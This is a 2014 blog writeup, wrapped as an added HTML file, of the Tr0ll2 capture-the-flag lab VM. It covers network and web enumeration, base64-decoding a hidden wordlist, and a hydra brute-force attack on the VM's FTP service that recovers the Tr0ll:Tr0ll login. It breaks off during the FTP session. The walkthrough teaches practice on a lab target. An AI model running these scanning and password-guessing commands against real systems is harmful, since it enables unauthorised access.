@@ -1,0 +1,1408 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Beating the Troll - Tr0ll2 Writeup - Knapsy&#8217;s brain dump</title>
+  <meta name="author" content="Knapsy">
+
+  
+  <meta name="description" content="Damn, I love VulnHub - always keeps me entertained! With so many VMs released recently and with me just coming off an awesome CTF I have been kept &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://knapsy.github.io/blog/2014/10/28/beating-the-troll-tr0ll2-writeup">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Knapsy's brain dump" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-55363999-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Knapsy&#8217;s brain dump</a></h1>
+  
+    <h2>IT security and other /dev/random stuff.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:knapsy.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Beating the Troll - Tr0ll2 Writeup</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-10-28T19:57:51+11:00'><span class='date'><span class='date-month'>Oct</span> <span class='date-day'>28</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>7:57 pm</span></time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://knapsy.github.io">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Damn, I love <a href="http://www.vulnhub.com">VulnHub</a> - always keeps me entertained! With so many VMs released recently and with me just coming off an awesome CTF I have been kept quite busy those last couple weeks! Keeping the momentum up, I decided to give <a href="http://vulnhub.com/entry/tr0ll-2,107/">Tr0ll2 VM</a> a shot. As expected, there were trolls on the way, but overall I quite enjoyed it! Alright, let&rsquo;s rock on.</p>
+
+<!-- more -->
+
+
+<h2>Recon</h2>
+
+<p>As per usual, let&rsquo;s boot up the VM and find its IP address using <code>netdiscover</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# netdiscover -r 172.16.246.0/24
+</span><span class='line'> Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                               
+</span><span class='line'>                                                                                                                                                             
+</span><span class='line'> 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                             
+</span><span class='line'> _____________________________________________________________________________
+</span><span class='line'>   IP            At MAC Address      Count  Len   MAC Vendor                   
+</span><span class='line'> ----------------------------------------------------------------------------- 
+</span><span class='line'> 172.16.246.1    00:50:56:c0:00:01    01    060   VMWare, Inc.                                                                                               
+</span><span class='line'> 172.16.246.135  00:0c:29:68:a8:92    01    060   VMware, Inc.                                                                                               
+</span><span class='line'> 172.16.246.254  00:50:56:f7:73:6c    01    060   VMWare, Inc.                                                                                               </span></code></pre></td></tr></table></div></figure>
+
+
+<p>And <code>nmap</code> to see what services are exposed:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nmap -sV 172.16.246.135
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-28 19:50 EST
+</span><span class='line'>Nmap scan report for 172.16.246.135
+</span><span class='line'>Host is up (0.00018s latency).
+</span><span class='line'>Not shown: 997 closed ports
+</span><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>21/tcp open  ftp     vsftpd 2.0.8 or later
+</span><span class='line'>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+</span><span class='line'>80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
+</span><span class='line'>MAC Address: 00:0C:29:68:A8:92 (VMware)
+</span><span class='line'>Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span class='line'>
+</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 24.28 seconds
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As expected, webserver running on port 80. By the way, looking at software and versions nothing seems to be immediatelly exploitable and FTP server doesn&rsquo;t allow annonymous login.</p>
+
+<h2>Enumerating the web server</h2>
+
+<p>Let&rsquo;s have a look at the website.</p>
+
+<p><img src="/images/posts/2014-10-28-beating-the-troll-tr0ll2-writeup/troll_main.png" alt="Troll" /></p>
+
+<p>First troll, many more to come! First thought - let&rsquo;s fire up <code>dirbuster</code> and see what it&rsquo;ll come up with. Unfortunately, it didn&rsquo;t come up with anything interesting at all.</p>
+
+<p>Let&rsquo;s check for <code>robots.txt</code> file.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent:*
+</span><span class='line'>Disallow:
+</span><span class='line'>/noob
+</span><span class='line'>/nope
+</span><span class='line'>/try_harder
+</span><span class='line'>/keep_trying
+</span><span class='line'>/isnt_this_annoying
+</span><span class='line'>/nothing_here
+</span><span class='line'>/404
+</span><span class='line'>/LOL_at_the_last_one
+</span><span class='line'>/trolling_is_fun
+</span><span class='line'>/zomg_is_this_it
+</span><span class='line'>/you_found_me
+</span><span class='line'>/I_know_this_sucks
+</span><span class='line'>/You_could_give_up
+</span><span class='line'>/dont_bother
+</span><span class='line'>/will_it_ever_end
+</span><span class='line'>/I_hope_you_scripted_this
+</span><span class='line'>/ok_this_is_it
+</span><span class='line'>/stop_whining
+</span><span class='line'>/why_are_you_still_looking
+</span><span class='line'>/just_quit
+</span><span class='line'>/seriously_stop
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Aha! Let&rsquo;s check is there anything interesting hiding there. I tried couple of the folders one by one, but it&rsquo;s gotten quite boring and repetitive, so I&rsquo;ve dumped all directories into <code>list.txt</code> file and crafted a very simple one-liner to do all the hard work for me :)</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# for dir in `cat list.txt`; do echo "------- $dir -------"; curl http://172.16.246.135$dir; done
+</span><span class='line'>------- /noob -------
+</span><span class='line'>&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
+</span><span class='line'>&lt;html&gt;&lt;head&gt;
+</span><span class='line'>&lt;title&gt;301 Moved Permanently&lt;/title&gt;
+</span><span class='line'>&lt;/head&gt;&lt;body&gt;
+</span><span class='line'>&lt;h1&gt;Moved Permanently&lt;/h1&gt;
+</span><span class='line'>&lt;p&gt;The document has moved &lt;a href="http://172.16.246.135/noob/"&gt;here&lt;/a&gt;.&lt;/p&gt;
+</span><span class='line'>&lt;hr&gt;
+</span><span class='line'>&lt;address&gt;Apache/2.2.22 (Ubuntu) Server at 172.16.246.135 Port 80&lt;/address&gt;
+</span><span class='line'>&lt;/body&gt;&lt;/html&gt;
+</span><span class='line'>------- /nope -------
+</span><span class='line'>&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
+</span><span class='line'>&lt;html&gt;&lt;head&gt;
+</span><span class='line'>&lt;title&gt;404 Not Found&lt;/title&gt;
+</span><span class='line'>&lt;/head&gt;&lt;body&gt;
+</span><span class='line'>&lt;h1&gt;Not Found&lt;/h1&gt;
+</span><span class='line'>&lt;p&gt;The requested URL /nope was not found on this server.&lt;/p&gt;
+</span><span class='line'>&lt;hr&gt;
+</span><span class='line'>&lt;address&gt;Apache/2.2.22 (Ubuntu) Server at 172.16.246.135 Port 80&lt;/address&gt;
+</span><span class='line'>&lt;/body&gt;&lt;/html&gt;
+</span><span class='line'>------- /try_harder -------
+</span><span class='line'>&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
+</span><span class='line'>&lt;html&gt;&lt;head&gt;
+</span><span class='line'>&lt;title&gt;404 Not Found&lt;/title&gt;
+</span><span class='line'>&lt;/head&gt;&lt;body&gt;
+</span><span class='line'>&lt;h1&gt;Not Found&lt;/h1&gt;
+</span><span class='line'>&lt;p&gt;The requested URL /try_harder was not found on this server.&lt;/p&gt;
+</span><span class='line'>&lt;hr&gt;
+</span><span class='line'>&lt;address&gt;Apache/2.2.22 (Ubuntu) Server at 172.16.246.135 Port 80&lt;/address&gt;
+</span><span class='line'>&lt;/body&gt;&lt;/html&gt;
+</span><span class='line'>
+</span><span class='line'>... (truncated) ...
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As you can see, quite a few of them resulted in <code>404 Not Found</code> and just a couple were invoking redirection to the same folder, but followed with <code>/</code>. I have manually visited all of them (<code>/noob/</code>, <code>/keep_trying/</code>, <code>/dont_bother</code> and <code>/ok_this_is_it/</code>) and they all contained the same image:</p>
+
+<p><img src="/images/posts/2014-10-28-beating-the-troll-tr0ll2-writeup/troll_kitty.jpg" alt="Troll Kitty" /></p>
+
+<p>I have saved each one of them for reference (looking at source code of the pages, they were all coming from different location, so the images could really be different).</p>
+
+<p>I have tried poking around a bit more and couldn&rsquo;t find anything else that seemed interesting, so I decided to look closer into the images, starting with the previously downloaded kitten ones. Let&rsquo;s run strings on them and see if something interesting comes up.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# strings cat_the_troll_dont_bother.jpg 
+</span><span class='line'>JFIF
+</span><span class='line'>#3-652-108?QE8&lt;M=01F`GMTV[\[7DcjcXjQY[W
+</span><span class='line'>)W:1:WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
+</span><span class='line'>"aq2
+</span><span class='line'>\vRH
+</span><span class='line'>sdwTi
+</span><span class='line'>
+</span><span class='line'>... (truncated) ...
+</span><span class='line'>
+</span><span class='line'>]=%em;
+</span><span class='line'>lj\p
+</span><span class='line'>*/ p?E$
+</span><span class='line'>Look Deep within y0ur_self for the answer</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ha! One from <code>/dont_bother/</code> contains a message! But what is it trying to tell us?</p>
+
+<p>&ldquo;look within y0ur_self&rdquo;? Hmmm, it could be another directory on the webserver?</p>
+
+<p><img src="/images/posts/2014-10-28-beating-the-troll-tr0ll2-writeup/y0ur_self.png" alt="y0ur_self Dir" /></p>
+
+<p>Sure it is!</p>
+
+<h2>Dictionaries and cracking passwords</h2>
+
+<p>Let&rsquo;s see what the <code>answer.txt</code> file contains.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>QQo=
+</span><span class='line'>QQo=
+</span><span class='line'>QUEK
+</span><span class='line'>QUIK
+</span><span class='line'>QUJNCg==
+</span><span class='line'>QUMK
+</span><span class='line'>QUNUSAo=
+</span><span class='line'>QUkK
+</span><span class='line'>QUlEUwo=
+</span><span class='line'>QU0K
+</span><span class='line'>QU9MCg==
+</span><span class='line'>QU9MCg==
+</span><span class='line'>QVNDSUkK
+</span><span class='line'>QVNMCg==
+</span><span class='line'>QVRNCg==
+</span><span class='line'>QVRQCg==
+</span><span class='line'>QVdPTAo=
+</span><span class='line'>QVoK
+</span><span class='line'>QVpUCg==
+</span><span class='line'>QWFjaGVuCg==
+</span><span class='line'>QWFsaXlhaAo=
+</span><span class='line'>QWFsaXlhaAo=
+</span><span class='line'>QWFyb24K
+</span><span class='line'>QWJiYXMK
+</span><span class='line'>QWJiYXNpZAo=
+</span><span class='line'>QWJib3R0Cg==
+</span><span class='line'>QWJib3R0Cg==
+</span><span class='line'>QWJieQo=
+</span><span class='line'>QWJieQo=
+</span><span class='line'>QWJkdWwK
+</span><span class='line'>QWJkdWwK
+</span><span class='line'>
+</span><span class='line'>... (truncated) ...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Looks like base64 encoded strings. Let&rsquo;s download the file and decode them all! Once again, simple one-liner will help us out:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# for word in `cat answer.txt`; do echo $word | base64 -d; done &gt; answer-decoded.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It will take a while&hellip; after all it&rsquo;s a pretty big file. Once all done, we can see that it&rsquo;s some kind of a dictionary.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# cat answer-decoded.txt 
+</span><span class='line'>
+</span><span class='line'>... (truncated) ...
+</span><span class='line'>
+</span><span class='line'>interpretative
+</span><span class='line'>interpreted
+</span><span class='line'>interpreter
+</span><span class='line'>interpreter
+</span><span class='line'>interpreters
+</span><span class='line'>interpreting
+</span><span class='line'>interpretive
+</span><span class='line'>interprets
+</span><span class='line'>interracial
+</span><span class='line'>interred
+</span><span class='line'>interrelate
+</span><span class='line'>interrelated
+</span><span class='line'>interrelates
+</span><span class='line'>interrelating
+</span><span class='line'>
+</span><span class='line'>... (truncated) ...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And upon further googling and researching, I found out that it seems to be a dictionary shipped by default with Ubuntu.</p>
+
+<p>Fortunately I had Ubuntu installed and decided to grab its dictionary and compare it to the <code>answer-decoded.txt</code> file - knowing trolls, probably some new words were added that could be the clue!</p>
+
+<p>First difference I noticed was that all apostrophies were trimmed out from <code>answer-decoded.txt</code>. Let&rsquo;s do the same for Ubuntu dictionary using a nice <code>vim</code> trick to remove everything from <code>'</code> till the end of the line:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>:%s/'[^$]*//g</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ok, this will result in some duplicates, so let&rsquo;s get rid of them on both files:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# sort -u answer-decoded.txt &gt; answer-decoded-nodup.txt
+</span><span class='line'>root@kali:~/Desktop# sort -u ubuntu-dict.txt &gt; ubuntu-dict-nodup.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And run <code>diff</code> on them:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# diff ubuntu-dict-nodup.txt -u answer-decoded-nodup.txt &gt; diff.txt
+</span><span class='line'>root@kali:~/Desktop# cat diff.txt
+</span><span class='line'>--- ubuntu-dict-nodup.txt  2014-10-28 06:25:08.083151991 -0400
+</span><span class='line'>+++ answer-decoded-nodup.txt    2014-10-28 06:25:21.103151724 -0400
+</span><span class='line'>@@ -2326,7 +2326,6 @@
+</span><span class='line'> angry
+</span><span class='line'> angst
+</span><span class='line'> angstrom
+</span><span class='line'>-Ångström
+</span><span class='line'> angstroms
+</span><span class='line'>
+</span><span class='line'>... (truncated) ...
+</span><span class='line'>
+</span><span class='line'>@@ -34174,6 +34161,7 @@
+</span><span class='line'> italics
+</span><span class='line'> Italy
+</span><span class='line'> Itasca
+</span><span class='line'>+ItCantReallyBeThisEasyRightLOL
+</span><span class='line'> itch
+</span><span class='line'> itched
+</span><span class='line'> itches
+</span><span class='line'>@@ -43524,6 +43512,7 @@
+</span><span class='line'> noon
+</span><span class='line'> noonday
+</span><span class='line'> noontime
+</span><span class='line'>+noooob_lol
+</span><span class='line'> noose
+</span><span class='line'> nooses
+</span><span class='line'> Nootka
+</span><span class='line'>@@ -67180,6 +67169,7 @@
+</span><span class='line'> trolleys
+</span><span class='line'> trollies
+</span><span class='line'> trolling
+</span><span class='line'>+trollololol
+</span><span class='line'> trollop
+</span><span class='line'> Trollope
+</span><span class='line'> trollops</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Awesome, so there are 3 strings that seem that were added to the original list:</p>
+
+<ul>
+<li>ItCantReallyBeThisEasyRightLOL</li>
+<li>noooob_lol</li>
+<li>trollololol</li>
+</ul>
+
+
+<p>We may be able to use them as passwords/usernames later.</p>
+
+<p>After more poking around, a cup of coffee and some frustration, I wasn&rsquo;t able to squeeze out anything interesting from the <code>answer.txt</code> file or the webserver, so I moved on to focus on FTP server.</p>
+
+<p>Having a list of <em>potential</em> usernames and passwords, I decided to perform dictionary attack on the FTP server using harvested data as below.</p>
+
+<p><em>Note: after numerous trials and errors, frustration and doubts, I decided to add more words to the dictionary</em></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# cat dict.txt 
+</span><span class='line'>ItCantReallyBeThisEasyRightLOL
+</span><span class='line'>noooob_lol
+</span><span class='line'>trollololol
+</span><span class='line'>noob
+</span><span class='line'>nope
+</span><span class='line'>try_harder
+</span><span class='line'>keep_trying
+</span><span class='line'>isnt_this_annoying
+</span><span class='line'>nothing_here
+</span><span class='line'>404
+</span><span class='line'>LOL_at_the_last_one
+</span><span class='line'>trolling_is_fun
+</span><span class='line'>zomg_is_this_it
+</span><span class='line'>you_found_me
+</span><span class='line'>I_know_this_sucks
+</span><span class='line'>You_could_give_up
+</span><span class='line'>dont_bother
+</span><span class='line'>will_it_ever_end
+</span><span class='line'>I_hope_you_scripted_this
+</span><span class='line'>ok_this_is_it
+</span><span class='line'>stop_whining
+</span><span class='line'>why_are_you_still_looking
+</span><span class='line'>just_quit
+</span><span class='line'>seriously_stop
+</span><span class='line'>troll
+</span><span class='line'>Tr0ll
+</span><span class='line'>Tr0ll2
+</span><span class='line'>Tr0ll:2
+</span><span class='line'>Tr0llv2
+</span><span class='line'>Maleus</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Let&rsquo;s use <code>hydra</code> and see if we&rsquo;ll be able to crack the username:password combination with any of those.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# hydra -t 30 -L dict.txt -P dict.txt 172.16.246.135 ftp -e nsr -f
+</span><span class='line'>Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only
+</span><span class='line'>
+</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) starting at 2014-10-28 21:42:16
+</span><span class='line'>[DATA] 30 tasks, 1 server, 990 login tries (l:30/p:33), ~33 tries per task
+</span><span class='line'>[DATA] attacking service ftp on port 21
+</span><span class='line'>
+</span><span class='line'>[STATUS] 620.00 tries/min, 620 tries in 00:01h, 370 todo in 00:01h, 30 active
+</span><span class='line'>[21][ftp] host: 172.16.246.135   login: Tr0ll   password: Tr0ll
+</span><span class='line'>[STATUS] attack finished for 172.16.246.135 (valid pair found)
+</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
+</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) finished at 2014-10-28 21:43:38</span></code></pre></td></tr></table></div></figure>
+
+
+<p>HAAAAAAAAAAA! Let&rsquo;s log-in using Tr0ll:Tr0ll credentials.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# ftp 172.16.246.135
+</span><span class='line'>Connected to 172.16.246.135.
+</span><span class='line'>220 Welcome to Tr0ll FTP... Only noobs stay for a while...
+</span><span class='line'>Name (172.16.246.135:root): Tr0ll
+</span><span class='line'>331 Please specify the password.
+</span><span class='line'>Password:
+</span><span class='line'>230 Login successful.
+</span><span class='line'>Remote system type is UNIX.
+</span><span class='line'>Using binary mode to transfer files.
+</span><span class='line'>ftp&gt; ls -al
+</span><span class='line'>200 PORT command successful. Consider using PASV.
+</span><span class='line'>150 Here comes the directory listing.
+</span><span class='line'>drwxr-xr-x    2 0        0            4096 Oct 04 01:24 .
+</span><span class='line'>drwxr-xr-x    2 0        0            4096 Oct 04 01:24 ..
